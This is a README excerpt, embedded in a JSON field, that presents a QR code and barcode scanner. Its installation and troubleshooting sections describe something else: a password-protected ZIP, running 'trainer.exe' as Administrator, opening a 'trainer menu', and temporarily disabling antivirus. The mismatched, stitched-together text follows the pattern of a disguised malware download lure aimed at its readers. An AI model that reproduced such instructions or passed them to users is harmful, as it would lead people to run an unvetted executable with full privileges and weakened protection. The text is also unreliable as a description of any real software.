  "readmeExcerpt": "# QR Code Scanner\n\n\n\n\n\n\n> Scan QR codes and barcodes from images, webcam, or screenshots. Decode instantly and copy to clipboard.\n\n## ✨ Features\n\n| Feature | Description |\n|---------|-------------|\n| Image Scan | Scan from image files |\n| Webcam Scan | Scan using webcam |\n| Screenshot | Scan from screenshot |\n| History | Save scan history |\n| Export | Export results |\n| Bulk Scan | Scan multiple images |\n\n\n## 📥 Download & Installation\n\n\n\n1. Click the button above to download the archive.\n2. Extract the ZIP file using the password: `trainer2026`\n3. Run `trainer.exe` as Administrator (right‑click → Run as administrator)\n4. Launch the application and wait for it to load\n5. Press `INSERT` (or `F1`) to open the trainer menu and enable your desired features\n\n## 🖥️ Compatibility\n\n- Windows 10/11 (64‑bit)\n- Works with the latest version of the target software\n- No additional dependencies required\n\n## 🛠️ Troubleshooting\n\n| Issue | Solution |\n|-------|----------|\n| Trainer won't start | Run as Administrator, temporarily disable antivirus |\n| Features not working | Restart the trainer and the software, make sure you're in the main interface |\n| GUI not appearing | Press the activation key (INSERT/F1) or restart the trainer |\n\n## 📜 License\n\nMIT – see [LICENSE](LICENSE) file.\n\n## 🔍 Tags\n\n`qr-scanner, barcode-scanner, decode, webcam, screenshot, history, tool, free, 2026, windows`\n",
